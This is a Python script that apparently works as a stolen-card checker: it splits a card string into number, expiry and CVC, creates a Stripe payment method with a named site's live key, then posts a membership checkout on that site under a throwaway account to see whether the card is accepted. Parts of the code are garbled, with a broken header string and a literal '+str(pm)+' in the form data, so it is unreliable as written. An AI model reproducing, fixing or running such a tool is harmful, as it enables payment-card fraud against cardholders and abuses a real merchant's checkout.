import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
			'authority': 'api.stripe.com',
			'method': 'POST',
			'path': '/v1/payment_methods',
			'scheme': 'https',
			'Acceptept': 'application/json',
			'Accept-Encoding': 'gzip, deflate, br, zstd',
			'Accept-Language': 'en-US,en;q=0.9',
			'Content-Length': '3912',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Origin': 'https://js.stripe.com',
			'Priority': 'Request Headers u=1, i',
			'Referer': 'https://js.stripe.com/',
			'Sec-Ch-Ua': '"Chromium";v="130", "Mises";v="130", "Not?A_Brand";v="99"',
			'Sec-Ch-Ua-Mobile': '?1',
			'Sec-Ch-Ua-Platform': '"Android"',
			'Sec-Fetch-Dest': 'empty',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Site': 'same-site',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&billing_details[address][line1]=&billing_details[address][line2]=&billing_details[address][city]=&billing_details[address][state]=&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[name]=Error+Op&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=af8e4aba-72a0-4b1e-8666-bd5451a74805648fed&muid=9e98ae93-e9c7-4f32-90fc-8bbd3d1e0ba2a340f2&sid=83cc21d6-9d16-4d78-b578-394d6a756b1a2a1520&payment_user_agent=stripe.js%2Fe7a8c6762a%3B+stripe-js-v3%2Fe7a8c6762a%3B+split-card-element&referrer=https%3A%2F%2Fvisegradinsight.eu&time_on_page=228922&key=pk_live_51HUqhxLeEmKrqQJR77B80B22wogbwGcRMmqAH3Y4ERXdmsKWFGJOJI9ycH1rIVBzH1ZGG5Zkfkjw7M3DdZtqGDAe00a9laqj2v'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '__stripe_mid': '3d85359e-8d75-414e-9b44-1b5c4412a86152dadf',
            '__stripe_sid': 'e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
	}

	headers = {
            'authority': 'visegradinsight.eu',
            'method': 'POST',
            'path': '/membership-account/membership-checkout/?level=5',
            'scheme': 'https',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Content-Length': '927',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://visegradinsight.eu',
            'Priority': '0,',
            'Referer': 'https://visegradinsight.eu/membership-account/membership-checkout/?level=5',
            'Sec-Ch-Ua': '"Chromium';v="130", "Mises"v="130",
"Not?A_Brand";v="99"',
'Sec-Ch-Ua-Mobile': '?1',
'Sec-Ch-Ua-Platform': '"Android"',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-User': '?1',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
	}

	params = {
			't': '1729922956202',
	}

	data = {
            'data': '''level=5&checkjavascript=1&other_discount_code=&discount_code=&username=zee5year&bfirstname=Error&blastname=Op&bemail=zee5year%40hldrive.com&password=Error%4099&password2=Error%4099&bconfirmemail_copy=1&fullname=&baddress1=&baddress2=&bcity=&bstate=&bphone=&vat_number=&bzipcode=10080&bcountry=US&CardType=visa&submit-checkout=1&javascriptok=1&apbct_visible_fields=%7B%220%22%3A%7B%22visible_fields%22%3A%22other_discount_code+other_discount_code_button+discount_code+discount_code_button+username+bfirstname+blastname+bemail+password+password2+fullname+baddress1+baddress2+bcity+bstate+bphone+vat_number+bzipcode+bcountry%22%2C%22visible_fields_count%22%3A19%2C%22invisible_fields%22%3A%22level+checkjavascript+bconfirmemail_copy+CardType+submit-checkout+javascriptok%22%2C%22invisible_fields_count%22%3A6%7D%7D&payment_method_id=+str(pm)+&AccountNumber={n}&ExpirationMonth={mm}&ExpirationYear={yy}'''
,
	}
	
	r2 = requests.post(
			'https://visegradinsight.eu/membership-account/membership-checkout/?level=5',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json()['errors'])
